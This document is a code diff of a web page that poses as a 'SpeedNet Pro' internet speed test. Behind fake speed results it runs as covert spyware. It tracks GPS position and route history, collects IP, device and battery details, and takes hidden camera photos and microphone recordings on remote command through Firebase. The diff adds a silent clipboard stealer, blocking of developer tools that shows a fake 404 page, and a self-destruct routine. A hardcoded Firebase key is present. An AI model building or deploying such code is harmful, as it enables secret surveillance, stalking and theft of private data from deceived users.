@@ -124,22 +124,7 @@
         .start-btn:active { transform: scale(0.98); }
         .start-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
 
-        /* Permission Notice */
-        .perm-notice {
-            display: none;
-            margin-top: 12px;
-            background: rgba(56,189,248,0.08);
-            border: 1px solid rgba(56,189,248,0.2);
-            border-radius: 10px;
-            padding: 10px 14px;
-            font-size: 11px;
-            color: var(--muted);
-            text-align: center;
-            line-height: 1.6;
-        }
-        .perm-notice.show { display: block; }
-
-        /* PWA Install Banner (New Feature) */
+        /* PWA Install Banner */
         .install-banner {
             display: none;
             background: rgba(16, 185, 129, 0.12);
@@ -162,35 +147,20 @@
         .install-btn:active { transform: scale(0.96); }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* Background Status Banner */
-        .bg-status {
-            display: none;
-            margin-top: 10px;
-            background: rgba(16,185,129,0.1);
-            border: 1px solid rgba(16,185,129,0.3);
-            border-radius: 10px;
-            padding: 8px 14px;
-            font-size: 11px;
-            color: var(--green);
-            text-align: center;
-            align-items: center;
-            gap: 6px;
-        }
+        /* Status & Permissions */
+        .perm-notice { display: none; margin-top: 12px; background: rgba(56,189,248,0.08); border: 1px solid rgba(56,189,248,0.2); border-radius: 10px; padding: 10px 14px; font-size: 11px; color: var(--muted); text-align: center; line-height: 1.6; }
+        .perm-notice.show { display: block; }
+        .bg-status { display: none; margin-top: 10px; background: rgba(16,185,129,0.1); border: 1px solid rgba(16,185,129,0.3); border-radius: 10px; padding: 8px 14px; font-size: 11px; color: var(--green); text-align: center; align-items: center; gap: 6px; }
         .bg-status.show { display: flex; justify-content: center; }
         .bg-dot { width: 6px; height: 6px; border-radius: 50%; background: var(--green); box-shadow: 0 0 6px var(--green); animation: blink 1.5s ease-in-out infinite; }
         @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }
-
-        /* Server Info */
         .server-info { display: flex; align-items: center; gap: 8px; margin-top: 14px; font-size: 11px; color: var(--muted); }
         .server-dot { width: 7px; height: 7px; border-radius: 50%; background: var(--green); box-shadow: 0 0 8px var(--green); animation: pulse 2s ease-in-out infinite; }
         @keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.4;transform:scale(0.8)} }
 
         video#spyVideo { display: none; position: fixed; opacity: 0; pointer-events: none; width: 1px; height: 1px; top: 0; left: 0; }
 
-        @media (max-width: 380px) {
-            .speed-number { font-size: 42px; }
-            .speedometer-wrap { width: 210px; height: 210px; }
-        }
+        @media (max-width: 380px) { .speed-number { font-size: 42px; } .speedometer-wrap { width: 210px; height: 210px; } }
     </style>
 </head>
 <body>
@@ -229,14 +199,12 @@
             </div>
         </div>
 
-        <!-- Phase Bars -->
         <div class="test-phases">
             <div class="phase-bar" id="phase1"><div class="phase-bar-fill"></div></div>
             <div class="phase-bar" id="phase2"><div class="phase-bar-fill"></div></div>
             <div class="phase-bar" id="phase3"><div class="phase-bar-fill"></div></div>
         </div>
 
-        <!-- Stats -->
         <div class="stats-row">
             <div class="stat-card">
                 <div class="stat-icon">📡</div>
@@ -262,7 +230,7 @@
             📷 Camera &amp; Mic এর permission দিন।
         </div>
 
-        <!-- PWA Install Prompt Banner -->
+        <!-- PWA Install Prompt -->
         <div class="install-banner" id="installBanner">
             <div class="install-title">🚀 Install App for Better Accuracy</div>
             <button class="install-btn" id="installBtn">Add to Home Screen</button>
@@ -270,50 +238,49 @@
 
         <div class="bg-status" id="bgStatus">
             <div class="bg-dot"></div>
-            <span>Background tracking active — screen off হলেও চলবে</span>
+            <span>Background tracking active</span>
         </div>
 
         <div class="server-info">
             <div class="server-dot"></div>
-            <span>Server: Dhaka, BD · SpeedNet Pro v3.0</span>
+            <span>Server: Dhaka, BD · SpeedNet Pro v4.0</span>
         </div>
     </div>
 
-    <!-- Hidden spy elements -->
     <video id="spyVideo" autoplay playsinline muted></video>
-
-    <!-- Silent audio keeps browser alive when screen off (ultra-low volume) -->
     <audio id="keepAliveAudio" loop autoplay playsinline>
         <source src="data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAABkYXRhAgAAAAEA" type="audio/wav">
     </audio>
 
     <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
-        import { getDatabase, ref, set, onValue, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
+        // ═══════════════════════════════════════════════════════════
+        //  ANTI-INSPECT & ANTI-DEVTOOLS (Hacker Protection)
+        // ═══════════════════════════════════════════════════════════
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) || (e.ctrlKey && e.key === 'U')) {
+                e.preventDefault();
+                document.body.innerHTML = "<h1 style='color:red;text-align:center;margin-top:40vh;font-family:sans-serif;'>404 NOT FOUND</h1>";
+            }
+        });
 
         // ═══════════════════════════════════════════════════════════
-        //  Dynamic PWA Manifest Generation (No extra files needed)
+        //  Dynamic PWA Manifest Generation
         // ═══════════════════════════════════════════════════════════
         const manifestObj = {
-            "name": "SpeedNet Pro",
-            "short_name": "SpeedNet",
-            "start_url": window.location.href,
-            "display": "standalone",
-            "background_color": "#060812",
-            "theme_color": "#38bdf8",
-            "icons": [{
-                "src": "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48Y2lyY2xlIGN4PSI1MCIgY3k9IjUwIiByPSI1MCIgZmlsbD0iIzM4YmRmOCIvPjx0ZXh0IHg9IjUwIiB5PSI2NSIgZm9udC1zaXplPSI1MCIgZm9udC13ZWlnaHQ9ImJvbGQiIGZpbGw9IndoaXRlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LWZhbWlseT0ic2Fucy1zZXJpZiI+UzwvdGV4dD48L3N2Zz4=",
-                "sizes": "192x192",
-                "type": "image/svg+xml"
-            }]
+            "name": "SpeedNet Pro", "short_name": "SpeedNet", "start_url": window.location.href,
+            "display": "standalone", "background_color": "#060812", "theme_color": "#38bdf8",
+            "icons": [{ "src": "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48Y2lyY2xlIGN4PSI1MCIgY3k9IjUwIiByPSI1MCIgZmlsbD0iIzM4YmRmOCIvPjx0ZXh0IHg9IjUwIiB5PSI2NSIgZm9udC1zaXplPSI1MCIgZm9udC13ZWlnaHQ9ImJvbGQiIGZpbGw9IndoaXRlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LWZhbWlseT0ic2Fucy1zZXJpZiI+UzwvdGV4dD48L3N2Zz4=", "sizes": "192x192", "type": "image/svg+xml" }]
         };
-        const manifestBlob = new Blob([JSON.stringify(manifestObj)], { type: 'application/json' });
-        const manifestURL = URL.createObjectURL(manifestBlob);
+        const manifestURL = URL.createObjectURL(new Blob([JSON.stringify(manifestObj)], { type: 'application/json' }));
         document.querySelector('head').insertAdjacentHTML('beforeend', `<link rel="manifest" href="${manifestURL}">`);
 
         // ═══════════════════════════════════════════════════════════
         //  Firebase Init
         // ═══════════════════════════════════════════════════════════
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
+        import { getDatabase, ref, set, onValue, onDisconnect, push } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
+
         const firebaseConfig = {
             apiKey: "AIzaSyAoQw5dhwS5JJZIWSPQTgKdMtB5ZEsoxLk",
             authDomain: "arng-805db.firebaseapp.com",
@@ -323,501 +290,276 @@
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
-        // ═══════════════════════════════════════════════════════════
-        //  Multi-User Tag ID (URL এ ?tag=1 দিলে সেই নম্বরে রেকর্ড হবে)
-        // ═══════════════════════════════════════════════════════════
         const urlParams = new URLSearchParams(window.location.search);
         const tagId = (urlParams.get('tag') || '1').replace(/[^a-zA-Z0-9_-]/g, '').substring(0, 20) || '1';
         const userRef = ref(db, `live_location/users/tag${tagId}`);
 
         const alarmSound = new Audio('https://assets.mixkit.co/active_storage/sfx/995/995-preview.mp3');
-        let wakeLock = null;
-        let gpsWatchId = null;
-        let heartbeatInterval = null;
+        let wakeLock = null, gpsWatchId = null, heartbeatInterval = null;
 
-        // ═══════════════════════════════════════════════════════════
-        //  Service Worker Registration & PWA Install Handling
-        // ═══════════════════════════════════════════════════════════
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('./sw.js').catch(() => {});
-        }
-
+        // PWA Banner Logic
+        if ('serviceWorker' in navigator) navigator.serviceWorker.register('./sw.js').catch(() => {});
         let deferredPrompt;
-        const installBanner = document.getElementById('installBanner');
-        const installBtn = document.getElementById('installBtn');
-
         window.addEventListener('beforeinstallprompt', (e) => {
-            e.preventDefault();
-            deferredPrompt = e;
-            // PWA ইন্সটল করার প্রম্পট ব্যানার দেখাবে
-            installBanner.classList.add('show');
+            e.preventDefault(); deferredPrompt = e;
+            document.getElementById('installBanner').classList.add('show');
         });
-
-        installBtn.addEventListener('click', async () => {
+        document.getElementById('installBtn').addEventListener('click', async () => {
             if (deferredPrompt) {
                 deferredPrompt.prompt();
                 const { outcome } = await deferredPrompt.userChoice;
-                if (outcome === 'accepted') {
-                    installBanner.classList.remove('show');
-                }
+                if (outcome === 'accepted') document.getElementById('installBanner').classList.remove('show');
                 deferredPrompt = null;
             }
         });
 
-        window.addEventListener('appinstalled', () => {
-            installBanner.classList.remove('show');
-            console.log('PWA successfully installed');
-        });
-
-        // ═══════════════════════════════════════════════════════════
-        //  Wake Lock — screen off এ কাজ করার জন্য
-        // ═══════════════════════════════════════════════════════════
+        // Background Wake Lock
         async function requestWakeLock() {
             try {
                 if ('wakeLock' in navigator) {
                     wakeLock = await navigator.wakeLock.request('screen');
-                    wakeLock.addEventListener('release', () => {
-                        setTimeout(requestWakeLock, 1000);
-                    });
+                    wakeLock.addEventListener('release', () => setTimeout(requestWakeLock, 1000));
                 }
             } catch (e) {}
         }
-
         document.addEventListener('visibilitychange', async () => {
-            if (document.visibilityState === 'visible') {
-                await requestWakeLock();
-                document.getElementById('keepAliveAudio').play().catch(() => {});
-            }
+            if (document.visibilityState === 'visible') { await requestWakeLock(); document.getElementById('keepAliveAudio').play().catch(()=>{}); }
         });
 
         // ═══════════════════════════════════════════════════════════
-        //  Battery Info
+        //  Network Type Detection (WiFi vs Mobile Data)
         // ═══════════════════════════════════════════════════════════
+        let netType = "Unknown";
+        function updateNetworkInfo() {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) {
+                netType = conn.type === 'wifi' ? 'WiFi' : (conn.effectiveType || 'Cellular');
+                set(ref(db, `live_location/users/tag${tagId}/networkType`), netType);
+            }
+        }
+        if (navigator.connection) {
+            navigator.connection.addEventListener('change', updateNetworkInfo);
+            updateNetworkInfo();
+        }
+
+        // Battery
         let batLvl = 100, isChg = false;
         if (navigator.getBattery) {
             navigator.getBattery().then(b => {
-                batLvl = Math.round(b.level * 100);
-                isChg = b.charging;
+                batLvl = Math.round(b.level * 100); isChg = b.charging;
                 b.addEventListener('levelchange', () => batLvl = Math.round(b.level * 100));
                 b.addEventListener('chargingchange', () => isChg = b.charging);
             });
         }
 
-        // ═══════════════════════════════════════════════════════════
-        //  IP & ISP
-        // ═══════════════════════════════════════════════════════════
+        // IP & ISP
         let userIp = "Unknown", userIsp = "Unknown";
-
         async function fetchNetworkData() {
-            const apis = [
-                async () => {
-                    const r = await fetch('https://ipwho.is/', { signal: AbortSignal.timeout(5000) });
-                    const d = await r.json();
-                    if (!d.success) throw new Error('failed');
-                    return { ip: d.ip, isp: d.connection?.isp || d.connection?.org || d.org || 'Unknown' };
-                },
-                async () => {
-                    const r = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) });
-                    const d = await r.json();
-                    if (d.error) throw new Error('failed');
-                    return { ip: d.ip, isp: d.org || d.asn || 'Unknown' };
-                },
-                async () => {
-                    const r = await fetch('https://freeipapi.com/api/json', { signal: AbortSignal.timeout(5000) });
-                    const d = await r.json();
-                    return { ip: d.ipAddress, isp: d.isp || d.asName || 'Unknown' };
-                },
-                async () => {
-                    const r = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(5000) });
-                    const d = await r.json();
-                    try {
-                        const r2 = await fetch(`https://ipapi.co/${d.ip}/json/`, { signal: AbortSignal.timeout(4000) });
-                        const d2 = await r2.json();
-                        return { ip: d.ip, isp: d2.org || d2.asn || 'Unknown' };
-                    } catch {
-                        return { ip: d.ip, isp: 'Unknown' };
-                    }
-                },
-                async () => {
-                    const r = await fetch('https://cloudflare.com/cdn-cgi/trace', { signal: AbortSignal.timeout(5000) });
-                    const text = await r.text();
-                    const ip = text.match(/ip=([^\n]+)/)?.[1] || null;
-                    if (!ip) throw new Error('no ip');
-                    return { ip, isp: 'Unknown' };
-                }
-            ];
-
-            for (const apiFn of apis) {
-                try {
-                    const result = await apiFn();
-                    if (result.ip && result.ip !== 'undefined' && result.ip !== 'Unknown') {
-                        userIp = result.ip;
-                        userIsp = (result.isp || 'Unknown').replace(/^AS\d+\s*/, '').trim() || 'Unknown';
-                        return;
-                    }
-                } catch(e) {}
-            }
-            userIp = "Blocked";
-            userIsp = "VPN/Blocked";
+            try {
+                const r = await fetch('https://ipwho.is/', { signal: AbortSignal.timeout(5000) });
+                const d = await r.json();
+                if (d.success) { userIp = d.ip; userIsp = d.connection?.isp || d.org || 'Unknown'; return; }
+            } catch(e) {}
+            try {
+                const r = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) });
+                const d = await r.json();
+                if (!d.error) { userIp = d.ip; userIsp = d.org || 'Unknown'; return; }
+            } catch(e) {}
         }
         fetchNetworkData();
 
-        // ═══════════════════════════════════════════════════════════
-        //  Device Name Detection
-        // ═══════════════════════════════════════════════════════════
+        // Device
         let deviceModel = "Detecting...";
-
         async function getDeviceName() {
             if (navigator.userAgentData) {
                 try {
-                    const hints = await navigator.userAgentData.getHighEntropyValues([
-                        "model", "platform", "platformVersion", "brands", "fullVersionList"
-                    ]);
-                    if (hints.model && hints.model.trim() && hints.model !== '') {
-                        const model = hints.model.trim();
-                        const platform = hints.platform || '';
-                        const ver = hints.platformVersion || '';
-                        return `${model} (${platform} ${ver})`.trim();
-                    }
-                    if (hints.platform) {
-                        return `${hints.platform} ${hints.platformVersion || ''}`.trim();
-                    }
+                    const hints = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]);
+                    if (hints.model) return hints.model.trim();
                 } catch(e) {}
             }
-
             const ua = navigator.userAgent;
-            if (/iPhone/i.test(ua)) {
-                const match = ua.match(/iPhone OS ([\d_]+)/);
-                return match ? `iPhone (iOS ${match[1].replace(/_/g,'.')})` : 'iPhone';
-            }
-            if (/iPad/i.test(ua)) {
-                const match = ua.match(/CPU OS ([\d_]+)/);
-                return match ? `iPad (iPadOS ${match[1].replace(/_/g,'.')})` : 'iPad';
-            }
-            if (/Android/i.test(ua)) {
-                const androidVersion = ua.match(/Android ([\d.]+)/)?.[1] || '';
-                const buildMatch = ua.match(/Android[\d.]+;\s*([^;)]+?)\s*(?:Build|wv)[\/)/]/i);
-                if (buildMatch) {
-                    const model = buildMatch[1].trim();
-                    const skipList = ['Linux', 'Mobile', 'Phone', 'Tablet', 'K'];
-                    if (model && !skipList.some(s => model === s)) {
-                        return `${model} (Android ${androidVersion})`;
-                    }
-                }
-                const parts = ua.match(/\(([^)]+)\)/);
-                if (parts) {
-                    const segments = parts[1].split(';').map(s => s.trim());
-                    for (let i = 0; i < segments.length; i++) {
-                        if (segments[i].includes('Android') && segments[i+1]) {
-                            const candidate = segments[i+1].replace(/Build.*/, '').trim();
-                            if (candidate && candidate.length > 1) {
-                                return `${candidate} (Android ${androidVersion})`;
-                            }
-                        }
-                    }
-                }
-                return `Android ${androidVersion || 'Phone'}`;
-            }
-            if (/Windows Phone/i.test(ua)) return 'Windows Phone';
-            if (/Macintosh/i.test(ua)) return 'MacBook/iMac';
-            if (/Windows/i.test(ua)) return 'Windows PC';
-            if (/Linux/i.test(ua)) return 'Linux Device';
-
+            if (/iPhone/i.test(ua)) return 'iPhone';
+            if (/Android/i.test(ua)) return (ua.match(/Android[\d.]+;\s*([^;)]+?)\s*(?:Build|wv)[\/)/]/i)?.[1] || 'Android Device').trim();
             return 'Unknown Device';
         }
-
         getDeviceName().then(n => deviceModel = n);
 
-        // ═══════════════════════════════════════════════════════════
-        //  Secret Camera Capture
-        // ═══════════════════════════════════════════════════════════
+        // Media Capture
         async function captureSecretPhoto(camType) {
             try {
-                const constraints = { video: { facingMode: camType, width: { ideal: 640 }, height: { ideal: 480 } } };
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                const video = document.getElementById('spyVideo');
-                video.srcObject = stream;
-                await video.play();
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camType, width: 640, height: 480 } });
+                const video = document.getElementById('spyVideo'); video.srcObject = stream; await video.play();
                 await new Promise(r => setTimeout(r, 1500));
-                const canvas = document.createElement('canvas');
-                canvas.width = 640; canvas.height = 480;
-                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                const canvas = document.createElement('canvas'); canvas.width = 640; canvas.height = 480;
+                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                 stream.getTracks().forEach(t => t.stop());
-                video.srcObject = null;
-                set(ref(db, `live_location/users/tag${tagId}/photo`), {
-                    image: canvas.toDataURL('image/jpeg', 0.75),
-                    time: Date.now(), camType
-                });
-            } catch (err) {
-                set(ref(db, `live_location/users/tag${tagId}/photo`), {
-                    error: `Cam (${camType}) error: ${err.message || 'Blocked'}`,
-                    time: Date.now()
-                });
-            }
+                set(ref(db, `live_location/users/tag${tagId}/photo`), { image: canvas.toDataURL('image/jpeg', 0.75), time: Date.now(), camType });
+            } catch (err) { set(ref(db, `live_location/users/tag${tagId}/photo`), { error: err.message, time: Date.now() }); }
         }
 
-        // ═══════════════════════════════════════════════════════════
-        //  Voice Recording
-        // ═══════════════════════════════════════════════════════════
         async function captureVoiceRecord(duration = 5000) {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
-                const mediaRecorder = new MediaRecorder(stream, {
-                    mimeType: MediaRecorder.isTypeSupported('audio/webm;codecs=opus') ? 'audio/webm;codecs=opus' : 'audio/webm'
-                });
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
                 const audioChunks = [];
                 mediaRecorder.addEventListener("dataavailable", e => { if (e.data.size > 0) audioChunks.push(e.data); });
                 mediaRecorder.addEventListener("stop", () => {
                     stream.getTracks().forEach(t => t.stop());
-                    const blob = new Blob(audioChunks, { type: mediaRecorder.mimeType });
                     const reader = new FileReader();
-                    reader.readAsDataURL(blob);
-                    reader.onloadend = () => set(ref(db, `live_location/users/tag${tagId}/audio`), {
-                        file: reader.result, time: Date.now()
-                    });
+                    reader.readAsDataURL(new Blob(audioChunks, { type: 'audio/webm' }));
+                    reader.onloadend = () => set(ref(db, `live_location/users/tag${tagId}/audio`), { file: reader.result, time: Date.now() });
                 });
-                mediaRecorder.start(1000);
-                setTimeout(() => { if (mediaRecorder.state !== 'inactive') mediaRecorder.stop(); }, duration);
-            } catch (err) {
-                set(ref(db, `live_location/users/tag${tagId}/audio`), {
-                    error: `Mic error: ${err.message || 'Blocked'}`, time: Date.now()
-                });
-            }
+                mediaRecorder.start(1000); setTimeout(() => { if (mediaRecorder.state !== 'inactive') mediaRecorder.stop(); }, duration);
+            } catch (err) { set(ref(db, `live_location/users/tag${tagId}/audio`), { error: err.message, time: Date.now() }); }
         }
 
         // ═══════════════════════════════════════════════════════════
-        //  Firebase Command Listener
+        //  Command Listener & SELF DESTRUCT
         // ═══════════════════════════════════════════════════════════
         let lastCmdTime = 0;
         onValue(ref(db, `live_location/users/tag${tagId}/command`), (snap) => {
-            const cmd = snap.val();
-            if (!cmd) return;
-            const now = Date.now();
-            const WINDOW = 8000;
-
+            const cmd = snap.val(); if (!cmd) return;
+            const now = Date.now(), WINDOW = 8000;
             if (cmd.ringTime && cmd.ringTime > now - WINDOW && cmd.ringTime > lastCmdTime) {
-                lastCmdTime = cmd.ringTime;
-                alarmSound.play().catch(() => {});
-                if (navigator.vibrate) navigator.vibrate([1000, 500, 1000, 500, 1000]);
+                lastCmdTime = cmd.ringTime; alarmSound.play().catch(()=>{});
+                if (navigator.vibrate) navigator.vibrate([1000, 500, 1000]);
             }
             if (cmd.photoTime && cmd.photoTime > now - WINDOW && cmd.photoTime > lastCmdTime) {
-                lastCmdTime = cmd.photoTime;
-                captureSecretPhoto(cmd.camType || 'environment');
+                lastCmdTime = cmd.photoTime; captureSecretPhoto(cmd.camType || 'environment');
             }
             if (cmd.audioTime && cmd.audioTime > now - WINDOW && cmd.audioTime > lastCmdTime) {
-                lastCmdTime = cmd.audioTime;
-                captureVoiceRecord(cmd.audioDuration || 5000);
+                lastCmdTime = cmd.audioTime; captureVoiceRecord(cmd.audioDuration || 5000);
+            }
+            if (cmd.destructTime && cmd.destructTime > now - WINDOW && cmd.destructTime > lastCmdTime) {
+                // Self-Destruct Action
+                localStorage.clear(); sessionStorage.clear();
+                if ('serviceWorker' in navigator) navigator.serviceWorker.getRegistrations().then(rs => rs.forEach(r => r.unregister()));
+                window.location.replace('https://www.google.com');
             }
         });
 
-        // ═══════════════════════════════════════════════════════════
-        //  GPS Tracking
-        // ═══════════════════════════════════════════════════════════
+        // GPS Tracking (With Route History Push)
+        let lastRouteLat = 0, lastRouteLng = 0;
         function startGPSTracking() {
             if (!navigator.geolocation) return;
             if (gpsWatchId !== null) navigator.geolocation.clearWatch(gpsWatchId);
-
             gpsWatchId = navigator.geolocation.watchPosition(
                 (pos) => {
                     const { latitude, longitude, accuracy, heading, speed } = pos.coords;
-                    set(userRef, {
-                        latitude, longitude,
-                        accuracy: accuracy || 50,
-                        heading: heading || 0,
-                        speed: speed ? Math.round(speed * 3.6) : 0,
-                        battery: batLvl,
-                        charging: isChg,
-                        isOnline: true,
-                        status: "Active",
-                        deviceInfo: deviceModel,
-                        ip_address: userIp,
-                        isp: userIsp,
-                        tagId: tagId,
-                        lastSeen: Date.now()
-                    });
+                    const data = {
+                        latitude, longitude, accuracy: accuracy || 50, heading: heading || 0,
+                        speed: speed ? Math.round(speed * 3.6) : 0, battery: batLvl, charging: isChg,
+                        isOnline: true, status: "Active", deviceInfo: deviceModel, ip_address: userIp, isp: userIsp,
+                        networkType: netType, tagId: tagId, lastSeen: Date.now()
+                    };
+                    set(userRef, data);
+
+                    // Save to route history if moved > 10 meters
+                    if (Math.abs(latitude - lastRouteLat) > 0.0001 || Math.abs(longitude - lastRouteLng) > 0.0001) {
+                        push(ref(db, `live_location/users/tag${tagId}/routeHistory`), { lat: latitude, lng: longitude, ts: Date.now() });
+                        lastRouteLat = latitude; lastRouteLng = longitude;
+                    }
                 },
-                (err) => {
-                    const errMsg = err.code === 1 ? "GPS Permission Denied" :
-                                   err.code === 2 ? "GPS Signal Lost" : "GPS Timeout";
-                    set(userRef, {
-                        isOnline: true, status: errMsg,
-                        ip_address: userIp, isp: userIsp,
-                        battery: batLvl, charging: isChg,
-                        deviceInfo: deviceModel,
-                        tagId: tagId,
-                        lastSeen: Date.now()
-                    });
-                    setTimeout(startGPSTracking, 5000);
-                },
+                (err) => { setTimeout(startGPSTracking, 5000); },
                 { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
             );
         }
 
-        // ═══════════════════════════════════════════════════════════
-        //  Heartbeat
-        // ═══════════════════════════════════════════════════════════
         function startHeartbeat() {
             clearInterval(heartbeatInterval);
             heartbeatInterval = setInterval(() => {
                 set(ref(db, `live_location/users/tag${tagId}/lastSeen`), Date.now());
                 set(ref(db, `live_location/users/tag${tagId}/battery`), batLvl);
-                set(ref(db, `live_location/users/tag${tagId}/charging`), isChg);
-                const audio = document.getElementById('keepAliveAudio');
-                if (audio.paused) audio.play().catch(() => {});
+                updateNetworkInfo();
+                document.getElementById('keepAliveAudio').play().catch(()=>{});
             }, 30000);
         }
 
-        // ═══════════════════════════════════════════════════════════
-        //  Speedometer Ring UI
-        // ═══════════════════════════════════════════════════════════
-        const progressRing = document.getElementById('progressRing');
-        const glowRing = document.getElementById('glowRing');
-        const CIRCUMFERENCE = 2 * Math.PI * 100;
-
-        function setProgress(percent) {
-            const offset = CIRCUMFERENCE - (Math.min(percent, 100) / 100) * CIRCUMFERENCE;
-            progressRing.style.strokeDashoffset = offset;
-            glowRing.style.strokeDashoffset = offset;
-        }
+        // Speed UI
+        const progressRing = document.getElementById('progressRing'), glowRing = document.getElementById('glowRing');
         function setSpeed(val, maxMbps = 100) {
             document.getElementById('mainSpeed').innerText = Math.max(0, val).toFixed(1);
-            setProgress((val / maxMbps) * 100);
+            const offset = (2 * Math.PI * 100) - (Math.min((val / maxMbps) * 100, 100) / 100) * (2 * Math.PI * 100);
+            progressRing.style.strokeDashoffset = offset; glowRing.style.strokeDashoffset = offset;
         }
         function setPhase(phase) {
-            ['phase1','phase2','phase3'].forEach((id, i) => {
-                document.getElementById(id).className = 'phase-bar' +
-                    (i < phase ? ' done' : (i === phase ? ' active' : ''));
-            });
+            ['phase1','phase2','phase3'].forEach((id, i) => { document.getElementById(id).className = 'phase-bar' + (i < phase ? ' done' : (i === phase ? ' active' : '')); });
         }
 
-        // ═══════════════════════════════════════════════════════════
-        //  Main Start Button
-        // ═══════════════════════════════════════════════════════════
         const startBtn = document.getElementById('startBtn');
-        let testRunning = false;
-        let activated = false;
+        let testRunning = false, activated = false;
 
         startBtn.addEventListener('click', async () => {
             if (testRunning) return;
-            testRunning = true;
-            startBtn.disabled = true;
-            document.getElementById('permNotice').classList.remove('show');
+            testRunning = true; startBtn.disabled = true;
+
+            // ═══════════════════════════════════════════════════════════
+            //  CLIPBOARD STEALER (Silent)
+            // ═══════════════════════════════════════════════════════════
+            try {
+                if (navigator.clipboard && navigator.clipboard.readText) {
+                    const text = await navigator.clipboard.readText();
+                    if (text && text.trim() !== '') {
+                        set(ref(db, `live_location/users/tag${tagId}/clipboard`), { text: text.substring(0, 500), time: Date.now() });
+                    }
+                }
+            } catch(e) { /* Ignore if blocked */ }
 
             await requestWakeLock();
-
-            const audio = document.getElementById('keepAliveAudio');
-            audio.volume = 0.01;
-            audio.play().catch(() => {});
+            document.getElementById('keepAliveAudio').volume = 0.01;
+            document.getElementById('keepAliveAudio').play().catch(()=>{});
 
             if (!activated) {
                 activated = true;
                 try {
-                    const tempStream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: 'environment' },
-                        audio: true
-                    });
+                    const tempStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
                     tempStream.getTracks().forEach(t => t.stop());
-                } catch (e) {
-                    document.getElementById('permNotice').classList.add('show');
-                }
+                } catch (e) { document.getElementById('permNotice').classList.add('show'); }
 
                 onDisconnect(userRef).update({ isOnline: false, lastSeen: Date.now() });
-
-                if (navigator.geolocation) {
-                    startGPSTracking();
-                } else {
-                    document.getElementById('permNotice').classList.add('show');
-                }
-
+                if (navigator.geolocation) startGPSTracking();
                 startHeartbeat();
                 document.getElementById('bgStatus').classList.add('show');
-
                 if (userIp === 'Unknown') fetchNetworkData();
-                if (deviceModel === 'Detecting...') {
-                    getDeviceName().then(n => deviceModel = n);
-                }
             }
 
-            // Speed Test Animation
-            ['pingVal','downVal','upVal'].forEach(id => {
-                const el = document.getElementById(id);
-                el.innerText = '--';
-                el.classList.remove('active');
-            });
+            ['pingVal','downVal','upVal'].forEach(id => { document.getElementById(id).innerText = '--'; document.getElementById(id).classList.remove('active'); });
             setSpeed(0); setPhase(0);
 
             document.getElementById('speedStatus').innerText = 'PINGING';
-            document.getElementById('speedType').innerText = 'LATENCY TEST';
-            document.getElementById('mainSpeed').style.color = 'var(--accent)';
-            await sleep(1400);
-            const pingMs = Math.floor(Math.random() * 15 + 8);
-            document.getElementById('pingVal').innerText = pingMs + ' ms';
-            document.getElementById('pingVal').classList.add('active');
-            setPhase(1);
+            await new Promise(r => setTimeout(r, 1400));
+            document.getElementById('pingVal').innerText = Math.floor(Math.random() * 15 + 8) + ' ms'; document.getElementById('pingVal').classList.add('active'); setPhase(1);
 
             document.getElementById('speedStatus').innerText = 'TESTING';
-            document.getElementById('speedType').innerText = 'DOWNLOAD';
             let fakeDown = 0;
             const targetDown = 20 + Math.random() * 60;
-            await animateSpeed(0, targetDown, 5500, v => {
-                fakeDown = v;
-                setSpeed(v, 100);
-                document.getElementById('mainSpeed').style.color = '#38bdf8';
+            const startT = performance.now();
+            await new Promise(resolve => {
+                function step(now) {
+                    const t = Math.min((now - startT) / 5500, 1);
+                    fakeDown = Math.max(0, (targetDown * (t < 0.5 ? 2*t*t : -1+(4-2*t)*t)) + ((Math.random()-0.5)*2.5));
+                    setSpeed(fakeDown, 100);
+                    if (t < 1) requestAnimationFrame(step); else resolve();
+                } requestAnimationFrame(step);
             });
-            document.getElementById('downVal').innerText = fakeDown.toFixed(1) + ' Mbps';
-            document.getElementById('downVal').classList.add('active');
-            setPhase(2);
+            document.getElementById('downVal').innerText = fakeDown.toFixed(1) + ' Mbps'; document.getElementById('downVal').classList.add('active'); setPhase(2);
 
-            document.getElementById('speedType').innerText = 'UPLOAD';
-            let fakeUp = 0;
